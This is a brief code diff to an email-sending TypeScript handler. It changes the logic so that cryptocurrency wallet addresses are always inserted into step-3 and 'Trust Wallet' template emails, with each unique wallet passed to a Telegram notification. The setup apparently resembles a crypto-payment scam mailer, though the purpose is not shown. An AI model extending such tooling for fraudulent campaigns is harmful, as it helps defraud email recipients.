@@ -384,8 +384,8 @@ const handler = async (req: Request): Promise<Response> => {
       }
     }
     
-    const walletPlaceholdersDetected = (step === 3 && (hasWalletPlaceholder(emailContent) || hasWalletPlaceholder(emailSubject))) ||
-                                      (isTrustWalletTemplate && commercialAutoIncludeWallet);
+    // Always include wallets for step 3 (Email3) and Trust Wallet templates
+    const walletPlaceholdersDetected = step === 3 || isTrustWalletTemplate;
     let walletWasUsed = false;
     let uniqueWallet = ''; // Store the wallet for Telegram notification
     
